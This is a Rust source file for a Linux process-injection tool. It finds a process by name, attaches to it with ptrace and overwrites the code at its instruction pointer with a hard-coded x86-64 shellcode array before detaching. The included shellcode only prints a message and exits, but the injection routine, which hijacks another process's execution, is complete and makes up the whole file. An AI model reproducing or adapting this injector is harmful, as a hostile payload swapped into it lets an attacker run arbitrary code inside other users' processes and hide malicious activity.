#![allow(non_snake_case)]

use sysinfo::System;
use std::ffi::{OsStr, c_void};
use nix::{sys::{ptrace::{self, detach, getregs, read, write, AddressType}, wait}, unistd::Pid};

// Shellcode prints "Injected: ar.p"
const SHELLCODE: [u8; 59] = [
                               0xb8,0x01,0x00,0x00,0x00,0x48,0xbe,0x49,0x6e,0x6a,0x65,0x63,0x74,0x65,0x64,0x56,
                               0x48,0x89,0xe6,0xba,0x08,0x00,0x00,0x00,0x0f,0x05,0xb8,0x01,0x00,0x00,0x00,0x48,
                               0xbe,0x3a,0x20,0x61,0x72,0x2e,0x70,0x00,0x00,0x56,0x48,0x89,0xe6,0xba,0x06,0x00,
                               0x00,0x00,0x0f,0x05,0xb8,0x3c,0x00,0x00,0x00,0x0f,0x05                            
                            ];


pub fn getPID(pname: String) { 

    // Create sysinfo object and refresh to collect current os state
    let mut sys = System::new();
    sys.refresh_all();

    // Getting Process Pid
    let ppid = sys.processes_by_name(OsStr::new(&pname)).take(1).next().expect(format!("{:?} is not active.", pname).as_str());
    let pid = ppid.pid().as_u32() as i32;

    // Check thread 
    THREAD(pid, pname);

}


fn THREAD(pid: i32, pname: String) {
    
    // Converting pid::i32 to unistd::Pid
    let pid = Pid::from_raw(pid);

    // Attaching to Process 
    ptrace::attach(pid).unwrap();
    println!("Attaching on {:?} PID: {}", pname, pid);

    // Wait for Signal
    wait::waitpid(pid, None).unwrap();

    // Performing memory injection 
    memINJECT(pid); 

    // Detach with no signal 
    detach(pid, None).unwrap();
    println!("Detach from PID: {}", pid);

}


fn memINJECT(pid: Pid) {
    
    // Getting register
    let mut rip = getregs(pid).unwrap().rip as u64;
    println!("Hijacking at RIP: {:#x}", rip);
    
    // Writing Shellcode to Process
    for byte in SHELLCODE.iter() {
        let data = *byte as *mut c_void;
        unsafe { write(pid, rip as AddressType, data).unwrap(); }
        rip += 1;
    }

    // Getting address of new rip
    let addr = getregs(pid).unwrap().rip as AddressType;
    
    // New data
    let _data = read(pid, addr).unwrap(); 
    println!("Memory inject at RIP: {:#x}", _data);

}
